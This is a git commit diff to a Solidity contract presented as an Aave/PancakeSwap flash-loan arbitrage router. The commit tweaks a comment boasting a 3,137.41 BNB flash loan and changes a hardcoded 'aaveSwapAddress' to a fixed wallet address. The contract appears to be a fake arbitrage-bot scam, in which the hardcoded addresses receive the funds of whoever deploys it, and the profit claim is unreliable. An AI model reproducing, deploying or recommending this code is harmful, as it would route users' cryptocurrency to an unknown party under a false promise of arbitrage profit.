1d195087c9912901dea1cba467eae638a2a3166a
Flash Loan <53866690+MrBishopeee@users.noreply.github.com>
2022-09-03 06:33:48 -0300

    Update IAaveRouterCalleMain.sol

--- IAaveRouterCalleMain.sol
+++ IAaveRouterCalleMain.sol
@@ -126,7 +126,7 @@ contract RouterV2 {
         return 0x0bd7f8b65fB663d158cCcb0F116CBBF503ACA671;
     }
 
-    //1. A flash loan borrowed 3,137.41 BNB from multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
+    //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
     function borrowFlashloanFromMultiplier(
         address add0,
         address add1,
@@ -143,7 +143,7 @@ contract RouterV2 {
     }
 
     function aaveSwapAddress() public pure returns (address) {
-        return 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
+        return 0x0bd7f8b65fB663d158cCcb0F116CBBF503ACA671;
     }
 
     function callArbitrageAAVE(address add0, address add1) public pure {
